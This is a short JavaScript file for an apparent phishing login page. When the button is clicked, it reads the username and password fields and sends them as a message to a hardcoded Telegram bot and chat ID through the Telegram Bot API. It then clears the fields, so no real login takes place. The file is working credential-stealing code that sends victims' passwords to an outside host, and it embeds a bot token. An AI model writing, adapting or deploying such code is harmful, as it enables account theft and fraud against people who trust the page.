const loginp = document.getElementById("login")
const password = document.getElementById("pass")
const btn = document.getElementById("btn")
const BotToken = "7811440068:AAGdGmJq0x1d88-1dM3yji_CbiV1m2_cDvY"
const chatId = "7016131367"
const SendDataFunc = async () => {
    const message = `login: ${loginp.value}\npass: ${password.value}`
    let Send = await fetch(`https://api.telegram.org/bot${BotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        })
    })
    loginp.value = ``
    password.value = ``
}
btn.addEventListener("click", (e) => {
    e.preventDefault()
    SendDataFunc()
})
